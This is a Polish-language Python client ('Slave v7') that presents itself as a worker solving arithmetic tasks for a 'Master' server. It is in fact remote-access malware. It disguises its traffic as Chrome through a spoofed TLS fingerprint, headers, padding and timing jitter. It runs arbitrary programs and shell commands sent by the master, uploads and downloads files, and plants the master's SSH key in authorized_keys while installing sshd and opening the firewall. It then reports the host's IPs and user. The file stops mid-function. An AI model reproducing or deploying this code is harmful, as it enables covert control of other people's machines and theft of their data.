"""Slave v7 - komunikuje się z Master przez HTTP/HTTPS i tokeny bearer.

Kod to małe funkcje: czyste (rozwiaz, zbuduj_pakiet_pracy, ...) oddzielone od
wejścia/wyjścia (HTTP/HTTPS, lokalny stan, log). Punkty rozbudowy:

    @operacja("%")        nowa operacja (dodaj symbol do OPERACJE w master.py)
  @po_zadaniu           funkcja wywoływana po każdym rozwiązanym zadaniu
                        (konfig, postep, odp_master, wynik) - np. własny log, statystyki
  @polecenie("nazwa")   nowe polecenie od Master: funkcja (konfig, postep, args) -> tekst wyniku
                        (dopisz też nazwę do POLECENIA_SLAVES w master.py)

Zadanie od Master = "operacja" (+ - * //) i "liczby" (tablica), składane od lewej do prawej:
"-" i [20, 3, 2]  ->  (20 - 3) - 2 = 15.

Cykl pracy: Slave wysyła żądania JSON do endpointu Master; przy HTTPS certyfikat domeny
weryfikuje standardowy magazyn CA Pythona.

Stan Slaves (ID i token sesyjny) jest zapisywany osobno w katalogu slave_state/.
HTTPS jest domyślnie włączony; domenę i token podaj opcjami CLI.

Uruchom:  python slave.py --master master.example.com --token-rejestracji <token> --nazwa bob
          python slave.py --no-https --master localhost:9000 --nazwa bob
"""
import argparse
import functools
import hashlib
import http.cookiejar
import json
import math
import os
import random
import shlex
import shutil
import socket
import sqlite3
import ssl
import subprocess
import sys
import threading
import time
import urllib.error
import urllib.request
from collections import deque
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional
from urllib.parse import quote, urlsplit

KATALOG = Path(__file__).parent
MAX_LINIA = 4 * 1024 * 1024
MIN_ODPYTYWANIE_S = 2.0
MAX_ODPYTYWANIE_S = 15.0
DEFAULT_MASTER_HOST = "localhost"
DEFAULT_HTTPS = True
PLIKI_CHUNK_B = 3 * 1024 * 1024
PLIKI_TIMEOUT_S = 60
PLIKI_MAX_B = 10 * 1024 * 1024 * 1024

# ─── stealth: TLS fingerprint + HTTP session ──────────────────────────────

_CHROME_CIPHERS = ":".join([
    "TLS_AES_128_GCM_SHA256", "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    "ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-CHACHA20-POLY1305",
    "ECDHE-RSA-AES128-SHA", "ECDHE-RSA-AES256-SHA",
    "AES128-GCM-SHA256", "AES256-GCM-SHA384",
])


def _make_ssl_ctx():
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
    try:
        ctx.set_ciphers(_CHROME_CIPHERS)
    except ssl.SSLError:
        pass
    ctx.set_alpn_protocols(["http/1.1"])
    ctx.load_default_certs()
    return ctx


def _make_opener():
    jar = http.cookiejar.CookieJar()
    ctx = _make_ssl_ctx()
    return urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(jar),
        urllib.request.HTTPSHandler(context=ctx),
    )


_opener = None
_opener_lock = threading.Lock()


def _get_opener():
    global _opener
    if _opener is None:
        with _opener_lock:
            if _opener is None:
                _opener = _make_opener()
    return _opener


_CHROME_MAJOR = 131
_CHROME_BUILD = random.randint(6700, 6850)
_UA = (f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
       f"(KHTML, like Gecko) Chrome/{_CHROME_MAJOR}.0.{_CHROME_BUILD}.0 Safari/537.36")
_SEC_CH_UA = (f'"Chromium";v="{_CHROME_MAJOR}", '
              f'"Not_A Brand";v="24", '
              f'"Google Chrome";v="{_CHROME_MAJOR}"')


def _chrome_headers(extra=None):
    h = {
        "User-Agent": _UA,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "sec-ch-ua": _SEC_CH_UA,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
    }
    if extra:
        h.update(extra)
    return h


_PAD_CHARS = "abcdefghijklmnopqrstuvwxyz0123456789"


def _pad_payload(obj):
    obj["_"] = "".join(random.choices(_PAD_CHARS, k=random.randint(8, 128)))
    return obj


def _jitter_sleep(base_s, stop_event):
    mu = math.log(max(base_s, 1.0))
    delay = max(1.0, min(random.lognormvariate(mu, 0.8), 90.0))
    if random.random() < 0.03:
        delay += random.uniform(30, 120)
    hour = time.localtime().tm_hour
    if hour < 6 or hour >= 23:
        delay *= random.uniform(2.0, 5.0)
    stop_event.wait(delay)


def _idle_jitter(stop_event):
    delay = max(2.0, min(random.lognormvariate(math.log(8.0), 0.9), 120.0))
    if random.random() < 0.05:
        delay += random.uniform(30, 180)
    hour = time.localtime().tm_hour
    if hour < 6 or hour >= 23:
        delay *= random.uniform(3.0, 8.0)
    stop_event.wait(delay)

# ================================================================== REJESTRY ==

OPERACJE = {}         # symbol -> funkcja(a, b)
HAKI_PO_ZADANIU = []  # funkcje (konfig, postep, odp_master, wynik)
POLECENIA = {}        # nazwa -> funkcja(konfig, postep, args) -> str


def operacja(symbol):
    def dekorator(f):
        OPERACJE[symbol] = f
        return f
    return dekorator


def po_zadaniu(f):
    HAKI_PO_ZADANIU.append(f)
    return f


def polecenie(nazwa):
    def dekorator(f):
        POLECENIA[nazwa] = f
        return f
    return dekorator


# ============================================================ KONFIG I STAN ==

@dataclass(frozen=True)
class Konfig:
    nazwa: str
    host: str
    port: int
    opoznienie: float = 1.0      # pauza (s) między zadaniami - żeby nie zarzynać Master
    cicho: bool = False          # tylko ważne komunikaty (przy wielu Slaves)
    plik_stanu: Optional[Path] = None
    token_rejestracji: Optional[str] = None
    domena_master: str = DEFAULT_MASTER_HOST
    https: bool = DEFAULT_HTTPS


@dataclass
class Postep:
    """Co Slave już zrobił i co ma wysłać w następnym pakiecie."""
    opoznienie: float = 1.0
    dobre: int = 0
    zle: int = 0
    odpowiedz: Optional[int] = None
    zadanie_id: Optional[int] = None
    cisza: bool = False
    pauza: bool = True
    stop: bool = False
    potwierdzenia: list = field(default_factory=list)       # wyniki poleceń do odesłania
    wykonane: deque = field(default_factory=lambda: deque(maxlen=200))   # ID wykonanych poleceń (bez dubli)
    # Dostęp dla komend transferu plików (ustawiane raz po rejestracji w uruchom()).
    slave_id: Optional[str] = None
    token: Optional[str] = None
    lacze: Optional[object] = None
    aktualne_cid: Optional[int] = None                      # id obecnie wykonywanego polecenia


def loguj(konfig, *tekst, wazne=True):
    if wazne or not konfig.cicho:
        print(f"[{time.strftime('%H:%M:%S')}] [{konfig.nazwa}]", *tekst, flush=True)


# ==================================================== OPERACJE I ZADANIA ==
# Czyste funkcje: bez sieci, bez plików.

@operacja("+")
def dodaj(a, b):
    return a + b


@operacja("-")
def odejmij(a, b):
    return a - b


@operacja("*")
def pomnoz(a, b):
    return a * b


@operacja("//")
def podziel_calkowicie(a, b):
    return a // b


def rozwiaz(op, liczby):
    """Liczby składane od lewej do prawej; bez eval(). Rzuca ValueError / ZeroDivisionError."""
    if op not in OPERACJE:
        raise ValueError(f"nieznana operacja: {op!r}")
    if not isinstance(liczby, list) or not liczby or not all(type(x) is int for x in liczby):
        raise ValueError("liczby muszą być niepustą tablicą liczb całkowitych")
    return functools.reduce(OPERACJE[op], liczby)


def zbuduj_pakiet_pracy(postep, bez_odpowiedzi=False):
    """Pakiet 'praca': odpowiedź na poprzednie zadanie (None za pierwszym razem), potwierdzenia
    poleceń i odpytywanie Master o polecenia. Pola opcjonalne są pomijane, żeby pakiet był mały."""
    pakiet = {"type": "sync",
              "result": None if bez_odpowiedzi else postep.odpowiedz,
              "task_id": None if bez_odpowiedzi else postep.zadanie_id}
    if postep.pauza or bez_odpowiedzi:
        pakiet["idle"] = True
    if postep.potwierdzenia:
        pakiet["acks"] = list(postep.potwierdzenia)
    return pakiet


def zastosuj_werdykt(postep, werdykt):
    """Aktualizuje liczniki po werdykcie Master ('ok' / 'zle' / 'nieaktualne' / None)."""
    if werdykt == "ok":
        postep.dobre += 1
    elif werdykt == "fail":
        postep.zle += 1


# ================================================================ POLECENIA ==
# Polecenie = funkcja (konfig, postep, args) -> tekst wyniku (wraca do Master jako potwierdzenie).

@polecenie("pauza")
def pol_pauza(konfig, postep, args):
    postep.pauza = True
    return "wstrzymany"


@polecenie("wznow")
def pol_wznow(konfig, postep, args):
    postep.pauza = False
    return "wznowiony"


@polecenie("status")
def pol_status(konfig, postep, args):
    return (f"OK {postep.dobre}, błędy {postep.zle}, pauza {'tak' if postep.pauza else 'nie'}, "
            f"opóźnienie {postep.opoznienie:g}s")


@polecenie("stop")
def pol_stop(konfig, postep, args):
    postep.stop = True
    return "kończę pracę"


# ─── transfer plików: HTTP helpers i komendy ───────────────────────────────

def _build_url(lacze, path):
    scheme = "https" if lacze.https else "http"
    authority = lacze.domena or lacze.host
    if ":" in authority and not authority.startswith("["):
        authority = f"[{authority}]"
    default_port = 443 if lacze.https else 80
    if lacze.port and lacze.port != default_port:
        authority = f"{authority}:{lacze.port}"
    return f"{scheme}://{authority}{path}"


def _plik_pobierz_chunk(lacze, slave_id, token, pol_id, off, limit=PLIKI_CHUNK_B,
                        timeout=PLIKI_TIMEOUT_S):
    """GET /plik/pobierz?pol=X&slave=S&off=Y&limit=N. Zwraca (bajty, total_opt) albo (None, msg)."""
    url = _build_url(lacze, f"/api/v2/blob/dl?pol={pol_id}&slave={quote(str(slave_id))}"
                            f"&off={off}&limit={limit}")
    req = urllib.request.Request(url, method="GET",
                                 headers=_chrome_headers({"Authorization": f"Bearer {token}"}))
    try:
        with _get_opener().open(req, timeout=timeout) as r:
            return r.read(limit + 1024), None
    except urllib.error.HTTPError as e:
        try:
            tresc = e.read().decode("utf-8", "replace")[:300]
        except Exception:
            tresc = str(e)
        return None, f"HTTP {e.code}: {tresc}"
    except (OSError, ValueError) as e:
        return None, f"sieć: {e}"


def _plik_wyslij_chunk(lacze, slave_id, token, pol_id, off, final, chunk,
                       timeout=PLIKI_TIMEOUT_S):
    """POST /plik/wyslij?pol=X&slave=S&off=Y&final=0|1 z surowymi bajtami. Zwraca (True, odebrano) albo (False, msg)."""
    url = _build_url(lacze, f"/api/v2/blob/up?pol={pol_id}&slave={quote(str(slave_id))}"
                            f"&off={off}&final={1 if final else 0}")
    req = urllib.request.Request(url, method="POST", data=chunk,
                                 headers=_chrome_headers({"Content-Type": "application/octet-stream",
                                          "Content-Length": str(len(chunk)),
                                          "Authorization": f"Bearer {token}"}))
    try:
        with _get_opener().open(req, timeout=timeout) as r:
            body = r.read(4096)
            try:
                d = json.loads(body)
                return bool(d.get("ok")), d.get("odebrano", 0)
            except (ValueError, json.JSONDecodeError):
                return False, "nieparsowalna odpowiedź"
    except urllib.error.HTTPError as e:
        try:
            tresc = e.read().decode("utf-8", "replace")[:300]
        except Exception:
            tresc = str(e)
        return False, f"HTTP {e.code}: {tresc}"
    except (OSError, ValueError) as e:
        return False, f"sieć: {e}"


@polecenie("wyslij")
def pol_wyslij(konfig, postep, args):
    """args: [sciezka_lokalna]. Slave czyta plik i strumieniuje chunkami do staging mastera."""
    if not args:
        return "BLAD podaj ścieżkę pliku"
    sciezka = Path(args[0])
    if not sciezka.is_file():
        return f"BLAD plik nie istnieje: {sciezka}"
    try:
        rozmiar = sciezka.stat().st_size
    except OSError as e:
        return f"BLAD stat: {e}"
    if rozmiar > PLIKI_MAX_B:
        return f"BLAD plik większy niż limit {PLIKI_MAX_B}"
    pol_id = postep.aktualne_cid
    if pol_id is None or postep.lacze is None:
        return "BLAD brak kontekstu polecenia"
    hasher = hashlib.sha256()
    off = 0
    try:
        with sciezka.open("rb") as f:
            while True:
                chunk = f.read(PLIKI_CHUNK_B)
                if not chunk and off > 0:
                    # Pusty finalizer dla pliku o rozmiarze dokładnie wielokrotności chunk.
                    ok, msg = _plik_wyslij_chunk(postep.lacze, postep.slave_id, postep.token,
                                                  pol_id, off, True, b"")
                    if not ok:
                        return f"BLAD finalize: {msg}"
                    break
                final = (off + len(chunk) >= rozmiar)
                hasher.update(chunk)
                ok, msg = _plik_wyslij_chunk(postep.lacze, postep.slave_id, postep.token,
                                              pol_id, off, final, chunk)
                if not ok:
                    return f"BLAD chunk off={off}: {msg}"
                off += len(chunk)
                if final:
                    break
    except OSError as e:
        return f"BLAD odczyt: {e}"
    return f"OK {off} B sha256={hasher.hexdigest()}"


@polecenie("pobierz")
def pol_pobierz(konfig, postep, args):
    """args: [sciezka_lokalna, oczekiwany_sha256, oczekiwany_rozmiar].
    Slave strumieniuje plik ze staging mastera chunkami i zapisuje pod podaną ścieżką."""
    if len(args) < 1:
        return "BLAD podaj ścieżkę docelową"
    sciezka = Path(args[0])
    oczekiwany_sha = args[1].lower() if len(args) > 1 else ""
    try:
        oczekiwany_rozmiar = int(args[2]) if len(args) > 2 else -1
    except ValueError:
        oczekiwany_rozmiar = -1
    pol_id = postep.aktualne_cid
    if pol_id is None or postep.lacze is None:
        return "BLAD brak kontekstu polecenia"
    try:
        sciezka.parent.mkdir(parents=True, exist_ok=True)
    except OSError as e:
        return f"BLAD mkdir: {e}"
    tymczasowy = sciezka.with_name(f".{sciezka.name}.{os.getpid()}.part")
    hasher = hashlib.sha256()
    off = 0
    try:
        with tymczasowy.open("wb") as f:
            while True:
                bajty, blad = _plik_pobierz_chunk(postep.lacze, postep.slave_id, postep.token,
                                                   pol_id, off)
                if bajty is None:
                    try: tymczasowy.unlink()
                    except OSError: pass
                    return f"BLAD chunk off={off}: {blad}"
                if not bajty:
                    break
                f.write(bajty)
                hasher.update(bajty)
                off += len(bajty)
                if off > PLIKI_MAX_B:
                    try: tymczasowy.unlink()
                    except OSError: pass
                    return f"BLAD plik przekracza {PLIKI_MAX_B}"
        got_sha = hasher.hexdigest()
        if oczekiwany_rozmiar >= 0 and off != oczekiwany_rozmiar:
            try: tymczasowy.unlink()
            except OSError: pass
            return f"BLAD rozmiar={off} vs oczekiwany {oczekiwany_rozmiar}"
        if oczekiwany_sha and got_sha != oczekiwany_sha:
            try: tymczasowy.unlink()
            except OSError: pass
            return f"BLAD sha256={got_sha} vs oczekiwany {oczekiwany_sha}"
        os.replace(tymczasowy, sciezka)
    except OSError as e:
        try: tymczasowy.unlink()
        except OSError: pass
        return f"BLAD zapis: {e}"
    return f"OK {off} B → {sciezka} sha256={got_sha}"


def _lokalne_ipv4():
    """Lista adresów IPv4 interfejsów (bez loopback), pierwszy — najbardziej "wychodzący"."""
    ips = []
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ips.append(s.getsockname()[0])
        s.close()
    except OSError:
        pass
    try:
        for info in socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET):
            ip = info[4][0]
            if not ip.startswith("127.") and ip not in ips:
                ips.append(ip)
    except (socket.gaierror, OSError):
        pass
    return ips[:5]


def _publiczne_ipv4():
    """Pyta zewnętrzny serwis o publiczne IP (timeout 3s, kilka źródeł)."""
    dozwolone = set("0123456789.:abcdefABCDEF")
    for url in ("https://api.ipify.org", "https://ifconfig.me/ip",
                "https://icanhazip.com", "https://ipv4.icanhazip.com"):
        try:
            with urllib.request.urlopen(url, timeout=3) as r:
                ip = r.read(60).decode("ascii", "ignore").strip()
                if ip and 7 <= len(ip) <= 45 and all(c in dozwolone for c in ip):
                    return ip
        except (urllib.error.URLError, OSError, UnicodeError, ValueError):
            continue
    return ""


# ----- helpery: zapewnij działający sshd ------------------------------------

def _uruchom(argv, *, timeout, env=None):
    """Thin wrapper: zwraca (rc, tekst) obciętego do 400 znaków. shell=False."""
    try:
        wynik = subprocess.run(argv, capture_output=True, text=True,
                               timeout=timeout, shell=False, env=env)
        tekst = (wynik.stdout + wynik.stderr).strip()
        return wynik.returncode, tekst[:400]
    except subprocess.TimeoutExpired:
        return 124, f"timeout ({timeout}s)"
    except OSError as e:
        return 127, f"błąd OS: {e}"


def _prefiks_sudo():
    """Zwraca [] gdy root, ['sudo','-n'] gdy sudo bez hasła dostępne, inaczej None."""
    try:
        if os.geteuid() == 0:
            return []
    except AttributeError:
        pass
    if shutil.which("sudo") is None:
        return None
    rc, _ = _uruchom(["sudo", "-n", "true"], timeout=3)
    return ["sudo", "-n"] if rc == 0 else None


def _dopisz_akcje(info, tekst):
    akcje = info.setdefault("sshd_akcje", [])
    if len(akcje) < 10:
        akcje.append(tekst[:120])


def _wykryj_init():
    if shutil.which("systemctl") and Path("/run/systemd/system").exists():
        return "systemd"
    return ""


def _wykryj_pakmen():
    for pm in ("pacman", "apt-get", "dnf", "yum", "apk", "zypper"):
        if shutil.which(pm):
            return pm
    return ""


def _komenda_instalacji(pm):
    """Zwraca (argv, env) do instalacji openssh-server przez wykryty pakmen."""
    env = None
    if pm == "pacman":
        argv = ["pacman", "-S", "--noconfirm", "--needed", "openssh"]
    elif pm == "apt-get":
        argv = ["apt-get", "-y", "install", "openssh-server"]
        env = {**os.environ, "DEBIAN_FRONTEND": "noninteractive"}
    elif pm in ("dnf", "yum"):
        argv = [pm, "-y", "install", "openssh-server"]
    elif pm == "apk":
        argv = ["apk", "add", "--no-cache", "openssh"]
    elif pm == "zypper":
        argv = ["zypper", "--non-interactive", "install", "openssh"]
    else:
        return None, None
    return argv, env


def _wykryj_port_sshd():
    """Z /etc/ssh/sshd_config{,.d/*} oraz `ss -tlnp` → port sshd. Fallback 22."""
    port = 22
    pliki = [Path("/etc/ssh/sshd_config")]
    try:
        pliki += sorted(Path("/etc/ssh/sshd_config.d").glob("*.conf"))
    except OSError:
        pass
    for p in pliki:
        try:
            for linia in p.read_text(encoding="utf-8", errors="replace").splitlines():
                s = linia.strip()
                if s.startswith("#") or not s.lower().startswith("port"):
                    continue
                czesci = s.split()
                if len(czesci) == 2 and czesci[0].lower() == "port":
                    try:
                        port = int(czesci[1])
                    except ValueError:
                        pass
        except OSError:
            continue
    if shutil.which("ss"):
        rc, tekst = _uruchom(["ss", "-tlnp"], timeout=5)
        if rc == 0:
            for linia in tekst.splitlines():
                if "sshd" not in linia:
                    continue
                for pole in linia.split():
                    if ":" in pole and pole.rsplit(":", 1)[1].isdigit():
                        try:
                            port = int(pole.rsplit(":", 1)[1])
                            break
                        except ValueError:
                            pass
                break
    return port


def _sshd_dziala():
    if shutil.which("systemctl"):
        for svc in ("ssh", "sshd"):
            rc, _ = _uruchom(["systemctl", "is-active", "--quiet", svc], timeout=5)
            if rc == 0:
                return True
    if shutil.which("pgrep"):
        rc, _ = _uruchom(["pgrep", "-x", "sshd"], timeout=5)
        if rc == 0:
            return True
    return False


def _zainstaluj_sshd(info):
    """Instaluje openssh-server. Mutuje info; nie podnosi."""
    if shutil.which("sshd"):
        return True
    pm = _wykryj_pakmen()
    if not pm:
        info["sshd_blad"] = info.get("sshd_blad") or "sshd nie zainstalowany, brak pakmena"
        _dopisz_akcje(info, "brak znanego pakmena (pacman/apt/dnf/apk/zypper)")
        return False
    prefiks = _prefiks_sudo()
    if prefiks is None:
        info["sshd_blad"] = info.get("sshd_blad") or "sshd nie zainstalowany, brak uprawnień root/sudo"
        _dopisz_akcje(info, f"brak sshd + brak sudo (pakmen: {pm})")
        return False
    argv, env = _komenda_instalacji(pm)
    if argv is None:
        info["sshd_blad"] = info.get("sshd_blad") or f"brak receptury instalacji dla {pm}"
        return False
    _dopisz_akcje(info, f"instaluję openssh ({pm})")
    rc, tekst = _uruchom(prefiks + argv, timeout=180, env=env)
    if rc == 0:
        _dopisz_akcje(info, f"{pm} install openssh — ok")
        return True
    info["sshd_blad"] = info.get("sshd_blad") or f"{pm} install nie powiodło się (rc={rc})"
    _dopisz_akcje(info, f"{pm} install rc={rc}: {tekst[:80]}")
    return False


def _wystartuj_sshd(info):
    """systemctl enable --now <svc>; fallback na service/rc-service."""
    prefiks = _prefiks_sudo()
    if prefiks is None:
        info["sshd_blad"] = info.get("sshd_blad") or "nie mogę wystartować sshd bez root/sudo"
        _dopisz_akcje(info, "brak uprawnień do uruchomienia sshd")
        return False
    if _wykryj_init() == "systemd":
        for svc in ("ssh", "sshd"):
            rc, tekst = _uruchom(prefiks + ["systemctl", "enable", "--now", svc], timeout=20)
            if rc == 0:
                _dopisz_akcje(info, f"sshd uruchomiony (serwis: {svc})")
                return True
            if "could not be found" in tekst.lower() or "not found" in tekst.lower():
                continue
            _dopisz_akcje(info, f"systemctl enable --now {svc} rc={rc}: {tekst[:80]}")
        info["sshd_blad"] = info.get("sshd_blad") or "systemctl enable --now nie powiódł się"
        return False
    for cmd in (["service", "ssh", "start"], ["service", "sshd", "start"],
                ["rc-service", "sshd", "start"]):
        if shutil.which(cmd[0]) is None:
            continue
        rc, tekst = _uruchom(prefiks + cmd, timeout=20)
        if rc == 0:
            _dopisz_akcje(info, f"sshd uruchomiony ({' '.join(cmd)})")
            return True
        _dopisz_akcje(info, f"{' '.join(cmd)} rc={rc}: {tekst[:60]}")
    info["sshd_blad"] = info.get("sshd_blad") or "nie udało się uruchomić sshd"
    return False


def _otworz_firewall(info, port):
    """Best-effort: ufw / firewalld. Nie ustawia sshd_blad przy niepowodzeniu."""
    prefiks = _prefiks_sudo()
    if prefiks is None:
        return
    if shutil.which("ufw"):
        rc, tekst = _uruchom(["ufw", "status"], timeout=5)
        if rc == 0 and "Status: active" in tekst:
            rc2, tekst2 = _uruchom(prefiks + ["ufw", "allow", f"{port}/tcp"], timeout=10)
            if rc2 == 0:
                _dopisz_akcje(info, f"ufw: otwarto {port}/tcp")
            else:
                _dopisz_akcje(info, f"ufw allow {port}/tcp rc={rc2}: {tekst2[:60]}")
            return
    if shutil.which("firewall-cmd"):
        rc, tekst = _uruchom(["firewall-cmd", "--state"], timeout=5)
        if rc == 0 and tekst.strip() == "running":
            rc2, tekst2 = _uruchom(prefiks + ["firewall-cmd", f"--add-port={port}/tcp",
                                              "--permanent"], timeout=10)
            if rc2 == 0:
                _uruchom(prefiks + ["firewall-cmd", "--reload"], timeout=10)
                _dopisz_akcje(info, f"firewalld: otwarto {port}/tcp")
            else:
                _dopisz_akcje(info, f"firewall-cmd rc={rc2}: {tekst2[:60]}")


def _zapewnij_sshd(info):
    """Pełna orkiestracja: wykryj / zainstaluj / wystartuj / otwórz firewall."""
    if _sshd_dziala():
        info["sshd_status"] = "running"
        _dopisz_akcje(info, "sshd już działa")
        info["sshd_port_wykryty"] = _wykryj_port_sshd()
        return
    if not shutil.which("sshd"):
        _dopisz_akcje(info, "sshd nie zainstalowany")
        if not _zainstaluj_sshd(info):
            info["sshd_status"] = "failed"
            return
    if not _wystartuj_sshd(info):
        info["sshd_status"] = "failed"
        return
    if _sshd_dziala():
        info["sshd_status"] = "started"
        info["sshd_port_wykryty"] = _wykryj_port_sshd()
        _otworz_firewall(info, info["sshd_port_wykryty"])
    else:
        info["sshd_status"] = "failed"
        info["sshd_blad"] = info.get("sshd_blad") or "sshd nadal nie działa po próbie startu"


@polecenie("promuj_ssh")
def pol_promuj_ssh(konfig, postep, args):
    """Instaluje klucz publiczny Mastera w ~/.ssh/authorized_keys, zapewnia że
    sshd działa (instalacja/start/firewall), i raportuje do Mastera adresy IP,
    nazwę hosta, użytkownika oraz wykryty port sshd."""
    if not args:
        raise ValueError("brak klucza publicznego")
    klucz = args[0].strip()
    if not klucz.startswith("ssh-") or "\n" in klucz:
        raise ValueError("nieprawidłowy klucz publiczny")

    home = Path.home()
    ssh_dir = home / ".ssh"
    auth = ssh_dir / "authorized_keys"
    ssh_dir.mkdir(mode=0o700, exist_ok=True)
    try: os.chmod(ssh_dir, 0o700)
    except OSError: pass

    dodano = True
    if auth.exists():
        istniejace = auth.read_text(encoding="utf-8", errors="replace").splitlines()
        if any(linia.strip() == klucz for linia in istniejace):
            dodano = False
    if dodano:
        with auth.open("a", encoding="utf-8") as f:
            if auth.stat().st_size and not auth.read_text(encoding="utf-8", errors="replace").endswith("\n"):
                f.write("\n")
            f.write(klucz + "\n")
    try: os.chmod(auth, 0o600)
    except OSError: pass

    uzytkownik = (os.environ.get("USER") or os.environ.get("LOGNAME") or "").strip()
    if not uzytkownik:
        try:
            import pwd
            uzytkownik = pwd.getpwuid(os.getuid()).pw_name
        except (ImportError, KeyError, OSError):
            uzytkownik = ""

    info = {
        "user": uzytkownik,
        "hostname": socket.gethostname(),
        "local_ips": _lokalne_ipv4(),
        "public_ip": _publiczne_ipv4(),
        "port": 22,
        "dodano_klucz": dodano,
        "sshd_akcje": [],
        "sshd_status": "",
        "sshd_blad": "",
        "sshd_port_wykryty": 22,
    }
    _zapewnij_sshd(info)
    info["port"] = info["sshd_port_wykryty"]
    return "PROMOCJA " + json.dumps(info, ensure_ascii=False)


@polecenie("exec")
def pol_exec(konfig, postep, args):
    if not args:
        return "podaj program do uruchomienia"
    if Path(args[0]).name == "sudo":
        if not sys.stdin.isatty():
            return "sudo wymaga terminala; uruchom Slaves bezpośrednio w terminalu"
        try:
            wynik = subprocess.run(args, shell=False)
            return f"(sudo zakończone: kod {wynik.returncode})"
        except OSError as e:
            return f"błąd OS: {e}"
    try:
        wynik = subprocess.run(args, capture_output=True, text=True, timeout=5, shell=False)
        return (wynik.stdout + wynik.stderr).strip()[:200] or f"(kod {wynik.returncode})"
    except subprocess.TimeoutExpired:
        return "timeout (5s)"
    except OSError as e:
        return f"błąd OS: {e}"


@polecenie("makro")
def pol_makro(konfig, postep, args):
    if not args:
        raise ValueError("makro nie zawiera poleceń")
    wyniki = []
    for numer, linia in enumerate(args, 1):
        linia = linia.strip()
        if not linia:
            continue
        try:
            wynik = subprocess.run(
                linia, capture_output=True, text=True, timeout=30, shell=True
            )
        except subprocess.TimeoutExpired:
            wyniki.append(f"{numer}. {linia}: timeout")
            raise ValueError("polecenie przekroczyło limit czasu:\n" + "\n".join(wyniki)) from None
        except OSError as e:
            wyniki.append(f"{numer}. {linia}: błąd OS: {e}")
            raise ValueError("makro przerwane:\n" + "\n".join(wyniki)) from None
        tekst = (wynik.stdout + wynik.stderr).strip() or f"(kod {wynik.returncode})"
        wyniki.append(f"{numer}. {linia}: {tekst}")
        if wynik.returncode:
            raise ValueError("makro przerwane po błędzie:\n" + "\n".join(wyniki))
    return "\n".join(wyniki)


def wykonaj_polecenia(konfig, postep, polecenia):
    """Wykonuje polecenia od Master i dokłada potwierdzenia do wysłania. Powtórzonych (po ID) nie
    wykonuje drugi raz - potwierdzenie z pierwszego wykonania i tak jeszcze czeka na wysłanie."""
    for p in polecenia:
        cid = p.get("id")
        if cid in postep.wykonane:
            continue
        postep.wykonane.append(cid)
        postep.aktualne_cid = cid
        try:
            funkcja = POLECENIA[p.get("cmd")]
            ok, wynik = True, funkcja(konfig, postep, [str(a) for a in p.get("args", [])])
        except KeyError:
            ok, wynik = False, f"nieznane polecenie: {p.get('cmd')!r}"
        except (IndexError, ValueError, ZeroDivisionError) as e:
            ok = False
            wynik = str(e) if p.get("cmd") == "makro" else f"błąd polecenia: {e!r}"
        finally:
            postep.aktualne_cid = None
        wynik = str(wynik)
        if p.get("cmd") not in ("makro", "wyslij", "pobierz"):
            wynik = wynik[:1000]
        postep.potwierdzenia.append({"id": cid, "broadcast": bool(p.get("broadcast")), "ok": ok, "output": wynik})


# ================================================================ REJESTRACJA ==

def wczytaj_token_rejestracji(token_podany=None):
    token = token_podany
    if not token:
        raise SystemExit("Pierwsza rejestracja wymaga opcji --token-rejestracji.")
    return token.strip()


# ======================================================================= LACZE ==
# HTTP/HTTPS do Master. Odpowiedź None = Master wstrzymany lub brak sieci.

@dataclass
class Lacze:
    host: str
    port: int
    domena: str = DEFAULT_MASTER_HOST
    https: bool = DEFAULT_HTTPS


def zapytaj(lacze, slave_id, token, obiekt, timeout=5.0):
    """Wysyła żądanie JSON przez persistent session z Chrome-like TLS/headers."""
    path = "/api/v2/session/new" if slave_id == "0" else f"/api/v2/session/{slave_id}"
    url = _build_url(lacze, path) + f"?_={int(time.time()*1000)}"
    _pad_payload(obiekt)
    request = urllib.request.Request(
        url,
        data=json.dumps(obiekt).encode("utf-8"),
        headers=_chrome_headers({"Content-Type": "application/json",
                                 "Authorization": f"Bearer {token}"}),
        method="POST",
    )
    try:
        with _get_opener().open(request, timeout=timeout) as response:
            body = response.read(MAX_LINIA + 1)
            if len(body) > MAX_LINIA:
                return None
            result = json.loads(body)
            return result if isinstance(result, dict) else None
    except urllib.error.HTTPError:
        return None
    except (OSError, ValueError, json.JSONDecodeError):
        return None


# ================================================== STAN LOKALNY ==

def sciezka_stanu(konfig):
    return konfig.plik_stanu or KATALOG / ".local" / "share" / f"{quote(konfig.nazwa, safe='')}.json"


def zapisz_stan(konfig, stan):
    sciezka = sciezka_stanu(konfig)
    sciezka.parent.mkdir(parents=True, exist_ok=True)
    tymczasowy = sciezka.with_name(f".{sciezka.name}.{os.getpid()}.tmp")
    try:
        tymczasowy.write_text(json.dumps(stan), encoding="utf-8")
        try:
            os.chmod(tymczasowy, 0o600)
        except OSError:
            pass
        os.replace(tymczasowy, sciezka)
    finally:
        try:
            tymczasowy.unlink()
        except FileNotFoundError:
            pass


def wczytaj_stan(konfig):
    """Czyta lokalny stan z osobnego pliku JSON Slaves."""
    sciezka = sciezka_stanu(konfig)
    if not sciezka.exists() and konfig.plik_stanu is None:
        nazwa = quote(konfig.nazwa, safe="")
        legacy_paths = (KATALOG / "slave_state" / f"{nazwa}.json",
                        KATALOG / "minion_stan" / f"{nazwa}.json",
                        KATALOG / f"minion_{konfig.nazwa}.json")
        for legacy_path in legacy_paths:
            if legacy_path.exists():
                sciezka.parent.mkdir(parents=True, exist_ok=True)
                os.replace(legacy_path, sciezka)
                break
